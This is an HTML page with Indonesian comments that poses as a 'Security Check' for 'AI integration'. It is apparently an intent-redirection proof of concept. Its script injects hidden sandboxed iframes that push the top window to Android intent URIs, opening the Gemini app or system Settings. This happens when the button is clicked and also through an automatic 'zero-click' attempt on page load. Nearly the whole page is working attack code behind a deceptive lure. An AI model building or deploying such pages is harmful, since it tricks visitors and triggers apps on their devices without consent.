<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 400px; width: 100%;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px;
    border-radius: 8px; font-size: 16px; font-weight: bold;
    cursor: pointer; border: none; width: 100%;
  }
  button:hover { background: #005bb5; }
  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 400px;
    height: 100px; overflow-y: auto; text-align: left;
  }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Check</h1>
  <p>Klik tombol di bawah untuk memverifikasi integrasi AI.</p>
  <button id="intentBtn">Open Gemini</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. TARGET INTENT (GEMINI & SETTINGS)
  // ============================================
  // Gemini Package: com.google.android.apps.bard
  // Settings Action: android.settings.SETTINGS
  
  var intentGemini = "intent://launch/#Intent;scheme=googleapp;package=com.google.android.apps.bard;end";
  var intentSettings = "intent://settings/#Intent;action=android.settings.SETTINGS;end";

  // ============================================
  // 2. FUNGSI INJECT IFRAME INTENT
  // ============================================
  function injectIntentIframe(targetIntent) {
    try {
      var iframe = document.createElement("iframe");
      
      // Atribut Sandbox yang meminta izin navigasi top-level
      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
      
      // Payload HTML di dalam iframe
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body style="margin:0;">
          <script>
            // Eksekusi Intent dari dalam iframe
            try {
              window.top.location.href = "${targetIntent}";
            } catch(e) {
              try { window.location.href = "${targetIntent}"; } catch(e2) {}
            }
          <\/script>
        </body>
        </html>
      `;
      
      iframe.style.display = "none";
      document.body.appendChild(iframe);
      
      log("[+] Iframe Intent injected: " + targetIntent.split(';')[0]);
    } catch(e) {
      log("[-] Gagal inject iframe: " + e.message);
    }
  }

  // ============================================
  // 3. EKSEKUSI SAAT TOMBOL DIKLIK
  // ============================================
  document.getElementById('intentBtn').addEventListener('click', function() {
    log("[!] Memicu Intent Redirection via Iframe...");
    
    // Coba buka Gemini
    injectIntentIframe(intentGemini);
    
    // Fallback: Coba buka Settings setelah 1 detik
    setTimeout(function() {
      log("[Fallback] Mencoba membuka Settings...");
      injectIntentIframe(intentSettings);
    }, 1000);
  });

  // ============================================
  // 4. ZERO-CLICK ATTEMPT (Otomatis saat Load)
  // ============================================
  setTimeout(function() {
    log("[Zero-Click] Mencoba inject iframe otomatis...");
    injectIntentIframe(intentGemini);
  }, 2000);

})();
</script>
</body>
</html>
